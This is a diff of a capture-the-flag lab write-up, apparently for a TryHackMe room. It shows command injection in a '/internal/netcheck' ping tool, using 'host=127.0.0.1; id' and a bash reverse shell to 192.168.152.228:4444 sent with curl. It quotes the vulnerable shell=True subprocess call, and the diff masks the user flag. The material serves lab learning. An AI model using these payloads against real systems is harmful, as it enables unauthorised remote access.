@@ -28,7 +28,6 @@ view-source:http://10.113.147.93/static/app.js
 
 Jackpot. A dev comment straight up says the `/status` tool posts to `/internal/netcheck`, calls it "legacy," and says it's disallowed in robots.txt "for now." That's basically a roadmap.
 
-`/status` turned out to be a "sister-property connectivity" tool — a form where staff type in a hostname and it checks if that property responds. Feels like a ping wrapper, and ping wrappers built on user input are a classic command injection setup. Tested it:
 
 ```
 curl -s -X POST http://10.113.147.93/internal/netcheck -d "host=127.0.0.1; id"
@@ -50,7 +49,7 @@ First attempt failed with a weird `Unterminated quoted string` error:
 curl -s -X POST http://10.113.147.93/internal/netcheck -d "host=127.0.0.1; bash -c 'bash -i >& /dev/tcp/192.168.152.228/4444 0>&1'"
 ```
 
-Took a second to realize why — the payload has a raw `&` in it (from `>&`), and curl's `-d` treats `&` as a field separator, so it was silently chopping the payload in half before it ever reached the server. Switched to `--data-urlencode` so the whole string gets sent as one intact value instead of getting split up:
+Took a second Look and Switched to `--data-urlencode` so the whole string gets sent as one intact value instead of getting split up:
 
 ```
 curl -s -X POST http://10.113.147.93/internal/netcheck --data-urlencode "host=127.0.0.1; bash -c 'bash -i >& /dev/tcp/192.168.152.228/4444 0>&1'"
@@ -60,7 +59,7 @@ Caught it on the listener right after.
 
 ![reverse shell caught](../Screenshots/infinity-pool/05-reverse-shell-caught.png)
 
-Landed as `web` in `/var/www/infinity_pool/edge`. Upgraded to a proper TTY with `python3 -c 'import pty; pty.spawn("/bin/bash")'` so I could actually work in it.
+Landed as `web` in `/var/www/infinity_pool/edge`. 
 
 Grabbed the app source while I was in the app directory, just to confirm exactly what was vulnerable:
 
@@ -70,7 +69,7 @@ cat app.py
 
 ![app.py source](../Screenshots/infinity-pool/06-app-py-source.png)
 
-Yep — `subprocess.run(f"ping -c 1 {host}", shell=True, ...)`. Host goes straight into a shell string, zero sanitization. Textbook.
+`subprocess.run(f"ping -c 1 {host}", shell=True, ...)`. Host goes straight into a shell string, zero sanitization. Textbook.
 
 ## User flag
 
@@ -80,7 +79,7 @@ cat /home/web/user.txt
 
 ![user flag](../Screenshots/infinity-pool/07-user-flag.png)
 
-`THM{n0_v1s1bl3_3dg3}`
+`THM{n0_*******_****}`
 
 ## Digging for privesc
 
